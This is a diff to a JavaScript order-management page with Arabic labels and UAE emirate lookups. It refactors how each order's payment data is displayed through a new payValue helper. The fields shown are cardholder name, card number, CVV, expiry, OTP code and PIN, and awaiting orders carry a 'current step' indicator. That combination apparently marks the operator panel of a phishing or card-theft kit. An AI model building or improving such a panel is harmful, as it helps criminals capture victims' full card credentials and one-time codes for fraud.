@@ -536,6 +536,11 @@ function fmtDate(ts){ const d = new Date(ts); return d.toLocaleString("ar-AE", {
 function areaName(em, a){ const E = EMIRATES.find(e=>e.id===em); return E && E.areas[+a] ? E.areas[+a].ar : ""; }
 function emName(em){ const E = EMIRATES.find(e=>e.id===em); return E ? E.ar : ""; }
 
+function payValue(v){
+  if (v === undefined || v === null || v === "" || v === true || v === false) return "—";
+  return String(v);
+}
+
 function openPop(ref){
   const o = loadOrders().find(x => x.ref === ref); if (!o) return;
   popRef = ref;
@@ -563,12 +568,12 @@ function openPop(ref){
       <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
     </div>
  ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
-<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(typeof o.pay.cardName === 'boolean' ? '-' : (o.pay.cardName || '-'))}</span></div>
-<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(typeof o.pay.cardNumber === 'boolean' ? '-' : (o.pay.cardNumber || o.pay.number || '-'))}</span></div>
-<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(typeof o.pay.cvv === 'boolean' ? '-' : (o.pay.cvv || '-'))}</span></div>
-<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(typeof o.pay.exp === 'boolean' ? '-' : (o.pay.exp || o.pay.expiry || '-'))}</span></div>
-<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v" style="direction:ltr">${esc(typeof o.pay.otp === 'boolean' ? '-' : (o.pay.otp || o.pay.code || '-'))}</span></div>
-<div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(typeof o.pay.pin === 'boolean' ? '-' : (o.pay.pin || '-'))}</span></div>
+<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(payValue(o.pay.cardName))}</span></div>
+<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.cardNumber || o.pay.number))}</span></div>
+<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.cvv))}</span></div>
+<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.exp || o.pay.expiry))}</span></div>
+<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.otp || o.pay.code))}</span></div>
+<div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.pin))}</span></div>
 </div></div>` : ""}
     ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
       <div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
